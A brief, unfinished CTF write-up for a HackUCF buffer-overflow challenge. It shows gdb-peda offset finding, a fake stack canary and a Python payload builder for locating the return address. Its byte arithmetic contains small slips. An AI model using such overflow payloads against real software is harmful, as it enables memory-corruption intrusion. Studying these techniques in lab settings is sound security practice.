# 50_ret

nc ctf.hackucf.org 9003




find offset
```
gdb-peda$ pattern offset 'AAdAA3'
AAdAA3 found at offset: 64
```
we found the offset now we need to find out
```
canary = "\xef\xbe\xad\xde"
testFiller = 'A'*5 + 'B'*5 + 'C'*5 + 'D' *5 + 'C'*5
offset = 64
filler ='A'*offset
payload = filler + canary + testFiller
print payload
```
`testFiller` will be used to find out the offset to the returnAddress

running the input from script will output this in gdp

```
Invalid $PC address: 0x44434343
```
reminder A in asci is 41, B =>42, C=>43, d=>43

so the extra is 5+5+2 with the two being the not being outputed from the 5 C's
